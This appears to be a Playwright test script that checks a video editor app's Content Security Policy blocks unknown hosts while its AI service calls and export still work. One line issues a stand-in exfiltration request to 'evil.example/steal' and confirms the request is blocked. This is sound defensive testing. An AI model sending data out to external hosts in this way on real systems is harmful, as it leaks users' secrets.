/* Security policy on hosted copies: unknown hosts are blocked, the AI services and the app itself still work. */
const { chromium } = require('playwright');const S=process.argv[2];const M=process.argv[3]||S;
(async()=>{const b=await chromium.launch();const ctx=await b.newContext({viewport:{width:1366,height:800},serviceWorkers:'block'});const p=await ctx.newPage();await p.addInitScript(()=>{try{localStorage.setItem('editbay.toured','1');sessionStorage.setItem('editbay.hostednote','1');localStorage.setItem('editbay.usageOptIn','no')}catch(e){}});
 const errs=[];p.on('pageerror',e=>errs.push(e.message));const cors={'access-control-allow-origin':'*','access-control-allow-headers':'*','content-type':'application/json'};
 await p.route('https://generativelanguage.googleapis.com/**',r=>r.fulfill({status:200,headers:cors,body:'{"models":[]}'}));await p.route('https://evil.example/**',r=>r.fulfill({status:200,headers:cors,body:'{}'}));
 await p.goto('http://localhost:8765/index.html');await p.waitForTimeout(1500);
 console.log('policy',await p.evaluate(()=>!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')));
 console.log('blocked',await p.evaluate(async()=>{try{await fetch('https://evil.example/steal?k=1');return false}catch(e){return true}}));
 console.log('allowed',await p.evaluate(async()=>{try{const r=await fetch('https://generativelanguage.googleapis.com/v1beta/models');return r.ok}catch(e){return false}}));
 await p.click('[data-welnew]');await p.fill('#n-title','CSP');await p.click('#newForm button[type=submit]');await p.waitForTimeout(300);
 await p.setInputFiles('#fileIn',[M+'/media/clipA.mp4']);await p.waitForTimeout(2500);await p.evaluate(()=>placeMedia(state.media[0].id,'V1',0));await p.waitForTimeout(500);
 await p.evaluate(()=>{openExport();E.x.lufs='off'});await p.evaluate(()=>runExport());console.log('export under policy',await p.evaluate(()=>E.x.phase));
 console.log(errs.slice(0,4).join(' | ')||'no errors');await b.close()})();
